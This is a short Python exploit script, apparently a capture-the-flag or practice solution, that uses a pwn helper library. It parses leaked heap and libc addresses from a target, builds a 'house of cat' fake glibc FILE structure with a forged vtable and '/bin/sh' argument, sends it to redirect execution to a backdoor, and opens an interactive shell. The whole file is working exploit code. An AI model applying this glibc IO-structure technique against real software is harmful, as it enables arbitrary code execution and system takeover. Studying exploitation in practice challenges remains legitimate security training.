from src.pwno.helper.IO import house_of_cat
from src.pwno import *


sh = gen_sh()
sh.recvuntil(b'p: ')
heap = int(recvl(keepends=False), 16)
sh.recvuntil(b'puts: ')
libc.address = int(recvl(keepends=False), 16) - libc.sym['puts']
sh.recvuntil(b'backd00r: ')
backd00r = int(recvl(keepends=False), 16)

cat = house_of_cat()
cat.fake_io_addr = heap
cat.rdi = b"/bin/sh\x00"
cat.rdx = p64(0xcafec0de)
cat.call_addr = p64(backd00r)
cat.vtable = p64(libc.sym['_IO_wfile_jumps'] + 0x30)

send(bytes(cat))
ia()